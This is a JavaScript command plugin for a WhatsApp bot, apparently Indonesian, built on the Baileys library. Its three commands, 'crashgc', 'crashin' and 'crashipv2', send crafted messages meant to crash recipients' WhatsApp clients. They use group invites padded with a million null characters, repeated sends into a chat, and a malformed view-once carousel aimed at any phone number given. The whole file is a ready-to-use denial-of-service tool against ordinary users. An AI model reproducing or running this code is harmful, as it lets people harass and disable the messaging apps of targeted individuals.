const { Cmd } = require("../lib/command") 
const { generateWAMessageContent, generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys") 
const { sleep } = require("../lib/myfunc")



Cmd({
command: '^crashgc$', 
type:'Pemilik', 
onlyOwner:true,
}, async(m, {conn, command, text}) => {
async function attack() {
var msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
groupInviteMessage: {
groupJid: "1234567890@g.us",
inviteCode: "abcdefg",
inviteExpiration: Date.now() + 86400000,
groupName: "Satzz 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 ϟ" + "\u0000".repeat(1000000),
jpegThumbnail: await getBuffer("https://i.ibb.co.com/LS0J8tV/2a705756-b25a-4c67-8496-8ebae9633e40.jpg"),
caption: "Satzz 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 ϟ",
groupType: 1,
}
}), {
userJid: m.chat,
quoted: m
})
return conn.relayMessage(m.chat, msg.message, {messageId: msg.key.id})
}
conn.public = false
await sleep(3000)
await attack()
await sleep(3000)
await attack()
await sleep(3000)
await attack()
await sleep(3000)
await attack()
await sleep(3000)
await attack()
await sleep(2000)
await attack()
await sleep(3000)
await attack()
await sleep(3000)
await attack()
await sleep(3000)
await attack()
await sleep(3000)
await attack()
conn.public = true
})

Cmd({
command: '^crashin$', 
type:'Pemilik', 
onlyPrem:true,
}, async(m, {conn, command, text, reply}) => {
if (!text) return reply('nomor?')
let numberTarget = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
var checkTarget = await conn.onWhatsApp(numberTarget);
if (numberTarget == m.sender) return reply("```Anda tidak dapat mengirim pesan ke nomor Anda sendiri!```");
if (checkTarget.length == 0) return reply('```Nomor tersebut tidak terdaftar di WhatsApp.\n\nSilakan masukkan nomor WhatsApp yang valid dan terdaftar.```');
await reply('prosess')
var msg = generateWAMessageFromContent(numberTarget, proto.Message.fromObject({
groupInviteMessage: {
groupJid: "1234567890@g.us",
inviteCode: "abcdefg",
inviteExpiration: Date.now() + 86400000,
groupName: "Created By SatzzDev." + "\u0000".repeat(1000000),
thumbnail: "SatzzDev!\u0000".repeat(1000000),
caption: "Created By SatzzDev.",
groupType: 1,
}
}), {userJid: numberTarget})
await conn.relayMessage(numberTarget, msg.message, {messageId: msg.key.id})
await reply('done')
})


Cmd({
command: '^crashipv2$', 
type:'Pemilik', 
onlyOwner:true,
}, async(m, {conn, command, text, reply}) => {
if (!text) return reply('nomor?')
let numberTarget = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
var checkTarget = await conn.onWhatsApp(numberTarget);
if (numberTarget == m.sender) return reply("```Anda tidak dapat mengirim pesan ke nomor Anda sendiri!```");
if (checkTarget.length == 0) return reply('```Nomor tersebut tidak terdaftar di WhatsApp.\n\nSilakan masukkan nomor WhatsApp yang valid dan terdaftar.```');
async function createImageMessage(imageUrl) {
const { imageMessage } = await generateWAMessageContent({'image': {'url': imageUrl}}, {'upload': conn.waUploadToServer});
return imageMessage;
}
let results = []
let imageUrls = ["https://github.com/SatganzDevs/DATABASES/raw/main/ASSETS/9ee74f6d81f77489bf0b6f542750a8e8.jpg","https://github.com/SatganzDevs/DATABASES/raw/main/ASSETS/97b7fa3e43e85ff55c0ef7055f424df2.jpg","https://github.com/SatganzDevs/DATABASES/raw/main/ASSETS/12a462b61dcc678aaa65091fcf976662.jpg"]
for (let imageUrl of imageUrls) {
results.push({
'body': proto.Message.InteractiveMessage.Body.fromObject({'text': ""}),
'footer': proto.Message.InteractiveMessage.Footer.fromObject({'text': global.author }),
'header': proto.Message.InteractiveMessage.Header.fromObject({
'title': `No Place To Hide!`,
'hasMediaAttachment': true,
'imageMessage': await createImageMessage(imageUrl)
}),
'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
'buttons': [{'name': 'cta_url', 'buttonParamsJson': JSON.stringify({"display_text": "Join Group","url": "https://www.google.com","merchant_url": "https://www.google.com"})}]
})
});
}
const messageContent = generateWAMessageFromContent(numberTarget, {
'viewOnceMessage': {
'message': {
'messageContextInfo': {
'deviceListMetadata': {},
'deviceListMetadataVersion': 2
},
'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
'body': proto.Message.InteractiveMessage.Body.create({
'text': "nih"
}),
'footer': proto.Message.InteractiveMessage.Footer.create({
'text': "Created By SatganzDevs"
}),
'header': proto.Message.InteractiveMessage.Header.create({
'hasMediaAttachment': true
}),
'Message': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
'cards': results
})
})
}
}
}, {});
await conn.relayMessage(numberTarget, messageContent.message, {'messageId': messageContent.key.id});
await reply('done')
})